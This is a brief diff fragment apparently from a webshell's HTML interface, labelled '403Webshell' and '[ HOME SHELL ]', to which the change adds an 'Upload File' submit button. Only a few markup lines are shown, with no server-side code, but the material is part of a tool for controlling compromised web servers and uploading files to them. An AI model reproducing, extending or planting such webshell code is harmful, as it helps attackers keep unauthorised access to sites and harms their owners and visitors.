@@ -1,4 +1,5 @@
 <input type="submit" value="ddok"/>
+<input type="submit" name="upload_file" value="Upload File">
 [ HOME SHELL ]
 aDriv4
 403Webshell
